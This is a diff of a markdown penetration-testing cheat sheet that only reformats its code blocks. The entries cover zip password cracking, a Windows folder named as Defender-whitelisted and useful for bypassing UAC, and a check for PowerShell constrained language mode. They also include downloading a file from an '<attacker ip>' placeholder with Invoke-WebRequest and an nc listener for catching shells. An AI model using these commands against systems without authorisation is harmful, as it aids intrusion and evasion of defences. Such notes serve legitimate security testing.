@@ -80,21 +80,29 @@ $ fcrackzip -u -D -p '/w/rockyou.txt' -v file.zip
 # Windows
 
 ## World-write/readable Directory, Windows Defender whitelist, and on UAC bypass list
-```C:\Windows\System32\spool\drivers\color\```
+```
+C:\Windows\System32\spool\drivers\color\
+```
 
 ## Powershell
 
 ### Is Poserwhell running in Constrained language mode?
-```$ExecutionContext.SessionState.LanguageMode```
+```
+$ExecutionContext.SessionState.LanguageMode
+```
 
 ### Download file over HTTP (works in CLM)
-```PS C:\> Invoke-WebRequest -uri http://<attacker ip>/<file> -o <output filename> ```
-```PS C:\> iwr -uri http://<attacker ip>/<file> -o <output filename> ```
+```
+PS C:\> Invoke-WebRequest -uri http://<attacker ip>/<file> -o <output filename>
+PS C:\> iwr -uri http://<attacker ip>/<file> -o <output filename>
+```
 
 # PostSploit
 
 ## Arrow-support for nc
-```rlwrap nc -nvlp 4444```
+```
+rlwrap nc -nvlp 4444
+```
 
 # Tmux
 | Action            | Command |
@@ -108,7 +116,9 @@ $ fcrackzip -u -D -p '/w/rockyou.txt' -v file.zip
 
 # Android
 ## Decompile APK
-```apktool d package.apk```
+```
+apktool d package.apk
+```
 
 ## Recompile APK
 ```
